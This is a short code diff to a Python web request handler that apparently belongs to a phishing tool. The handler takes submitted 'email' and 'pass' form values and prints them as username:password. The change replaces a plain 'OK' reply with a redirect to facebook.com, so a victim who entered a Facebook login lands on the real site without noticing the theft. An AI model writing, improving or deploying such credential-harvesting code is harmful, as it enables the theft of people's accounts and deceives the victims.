@@ -67,10 +67,10 @@ class WebRequestHandler(BaseHTTPRequestHandler):
         username_or_phone_number = str(form_data["email"][0])
         password = str(form_data["pass"][0])
         print(username_or_phone_number + ":" + password)
-        self.send_response(200)
-        self.send_header('Context-type', 'text/html')
+        self.send_response(302)
+        self.send_header('Location', 'https://facebook.com')
         self.end_headers()
-        self.wfile.write(b'OK')
+        print("[+] Redirected to facebook")
 
     def get_response(self):
         return json.dump(
